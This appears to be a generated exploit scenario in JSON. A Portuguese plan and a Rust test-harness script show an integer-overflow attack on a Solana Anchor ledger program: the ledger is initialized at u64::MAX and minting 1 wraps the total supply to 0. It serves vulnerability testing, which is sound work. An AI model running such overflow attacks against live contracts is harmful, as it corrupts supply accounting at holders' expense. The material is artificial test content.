{
  "plan": "Inicializa a conta Ledger com total_supply = u64::MAX e user_balance = 0 usando a instrução initialize (baseline). Em seguida, chama mint com amount = 1, que usa wrapping_add e deve causar overflow silencioso, fazendo total_supply voltar a 0. O efeito medido é que total_supply após o ataque é 0 (ou menor que o valor inicial), demonstrando a vulnerabilidade de overflow.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger ainda não inicializada
let ledger_account = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: inicializa o ledger com total_supply = u64::MAX
let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let init_accounts = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let init_result = env.baseline("initialize ledger with max supply", &init_ix, &init_accounts);

// Extrai a conta ledger resultante do baseline
let ledger_after_init = after(&init_result, &ledger_key).clone();

// Ataque: mint com amount = 1, causando overflow em total_supply
let mint_ix = env.anchor_ix(
    "mint",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let mint_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("mint 1 causing overflow", &mint_ix, &mint_accounts);

if attack_result.program_result == ProgramResult::Success {
    let ledger_data = after(&attack_result, &ledger_key).data();
    let total_supply = read_u64(ledger_data, 40); // offset: 8 discriminator + 32 authority
    env.effect("total_supply wrapped to 0", total_supply == 0);
}"
}

